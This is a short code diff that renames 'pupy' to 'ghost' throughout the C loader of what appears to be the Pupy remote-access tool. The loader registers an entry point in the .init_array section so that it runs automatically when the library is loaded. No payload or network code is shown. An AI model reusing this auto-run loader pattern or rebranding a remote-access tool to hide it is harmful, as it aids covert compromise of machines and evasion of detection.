@@ -6,7 +6,7 @@
 
 #include <dlfcn.h>
 
-#include "pupy_load.h"
+#include "ghost_load.h"
 #include "tmplibrary.h"
 #include "debug.h"
 
@@ -60,7 +60,7 @@ thread_start(void *arg) {
 
 static void
 unloader(void) {
-    dprint("Wait until pupy thread exits\n");
+    dprint("Wait until ghost thread exits\n");
     pthread_join(thread_id, NULL);
     dprint("Sutting down\n");
 }
@@ -92,8 +92,8 @@ __on_exit(int status, void *data) {
 }
 
 static void
-_pupy_main(int argc, char* argv[], char* envp[]) {
-    dprint("pupy loader ctor called\n");
+_ghost_main(int argc, char* argv[], char* envp[]) {
+    dprint("ghost loader ctor called\n");
     dprint("fill_argv called: %d/%p/%p\n", argc, argv, envp);
 #ifdef DEBUG
     int i;
@@ -154,4 +154,4 @@ _pupy_main(int argc, char* argv[], char* envp[]) {
     dprint("init_array completed\n");
 }
 
-__attribute__((section(".init_array"))) void (* pupy_main)(int, char*[], char*[]) = _pupy_main;
+__attribute__((section(".init_array"))) void (* ghost_main)(int, char*[], char*[]) = _ghost_main;
